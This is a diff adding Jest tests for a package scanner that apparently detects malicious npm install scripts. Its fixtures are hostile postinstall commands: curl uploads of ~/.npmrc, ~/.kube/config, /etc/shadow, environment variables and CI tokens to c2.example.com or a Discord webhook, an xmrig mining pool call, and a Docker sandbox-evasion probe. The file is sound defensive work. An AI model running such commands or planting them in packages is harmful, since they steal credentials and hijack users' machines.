@@ -158,6 +158,89 @@ describe("scanPackage — synthetic single-token fixtures", () => {
     const { findings } = scanPackage(scripts, emptyFileMap, "low");
     expect(findings.some((f) => f.category === "dynamic_require")).toBe(false);
   });
+
+  // living_off_land
+  it("detects python -c as living_off_land", () => {
+    const scripts = { postinstall: "python3 -c 'import urllib; urllib.request.urlopen(u)'" };
+    const { findings } = scanPackage(scripts, emptyFileMap, "low");
+    expect(findings.some((f) => f.category === "living_off_land")).toBe(true);
+  });
+
+  it("detects perl -e as living_off_land", () => {
+    const scripts = { postinstall: "perl -e 'use Socket; ...'" };
+    const { findings } = scanPackage(scripts, emptyFileMap, "low");
+    expect(findings.some((f) => f.category === "living_off_land")).toBe(true);
+  });
+
+  // cryptomining
+  it("detects xmrig as cryptomining/critical", () => {
+    const scripts = { postinstall: "./xmrig --pool stratum+tcp://pool.example.com:3333" };
+    const { findings } = scanPackage(scripts, emptyFileMap, "low");
+    const f = findings.find((f) => f.category === "cryptomining");
+    expect(f).toBeDefined();
+    expect(f?.severity).toBe("critical");
+  });
+
+  it("detects stratum+tcp as cryptomining/critical", () => {
+    const scripts = { postinstall: "miner --url stratum+tcp://xmr.pool.minergate.com:45700" };
+    const { findings } = scanPackage(scripts, emptyFileMap, "low");
+    expect(findings.some((f) => f.category === "cryptomining")).toBe(true);
+  });
+
+  // webhook_exfil
+  it("detects Discord webhook URL as webhook_exfil/high", () => {
+    const scripts = { postinstall: "curl https://discord.com/api/webhooks/123/abc -d @~/.npmrc" };
+    const { findings } = scanPackage(scripts, emptyFileMap, "low");
+    const f = findings.find((f) => f.category === "webhook_exfil");
+    expect(f).toBeDefined();
+    expect(f?.severity).toBe("high");
+  });
+
+  it("detects Slack webhook as webhook_exfil", () => {
+    const scripts = { postinstall: "curl https://hooks.slack.com/services/T00/B00/xxx -d '{\"text\":\"hi\"}'" };
+    const { findings } = scanPackage(scripts, emptyFileMap, "low");
+    expect(findings.some((f) => f.category === "webhook_exfil")).toBe(true);
+  });
+
+  // sandbox_evasion
+  it("detects /.dockerenv probe as sandbox_evasion/medium", () => {
+    const scripts = { postinstall: "[ -f /.dockerenv ] && exit 0 || curl https://c2.example.com" };
+    const { findings } = scanPackage(scripts, emptyFileMap, "low");
+    const f = findings.find((f) => f.category === "sandbox_evasion");
+    expect(f).toBeDefined();
+    expect(f?.severity).toBe("medium");
+  });
+
+  // system_recon
+  it("detects /proc/self/environ as system_recon/critical", () => {
+    const scripts = { postinstall: "cat /proc/self/environ | curl -d @- https://c2.example.com" };
+    const { findings } = scanPackage(scripts, emptyFileMap, "low");
+    const f = findings.find((f) => f.category === "system_recon");
+    expect(f).toBeDefined();
+    expect(f?.severity).toBe("critical");
+  });
+
+  it("detects /etc/shadow reference as system_recon/critical", () => {
+    const scripts = { postinstall: "cp /etc/shadow /tmp/s && curl -F f=@/tmp/s https://c2.example.com" };
+    const { findings } = scanPackage(scripts, emptyFileMap, "low");
+    expect(findings.some((f) => f.category === "system_recon")).toBe(true);
+  });
+
+  // expanded env_probe
+  it("detects ACTIONS_RUNTIME_TOKEN as env_probe", () => {
+    const scripts = { postinstall: "curl https://c2.example.com -H \"Auth: $ACTIONS_RUNTIME_TOKEN\"" };
+    const { findings } = scanPackage(scripts, emptyFileMap, "low");
+    expect(findings.some((f) => f.category === "env_probe")).toBe(true);
+  });
+
+  // expanded credential_files
+  it("detects ~/.kube/config reference as credential_files/high", () => {
+    const scripts = { postinstall: "curl -F f=@~/.kube/config https://c2.example.com" };
+    const { findings } = scanPackage(scripts, emptyFileMap, "low");
+    const f = findings.find((f) => f.category === "credential_files");
+    expect(f).toBeDefined();
+    expect(f?.severity).toBe("high");
+  });
 });
 
 describe("PATTERN_REGISTRY integrity", () => {
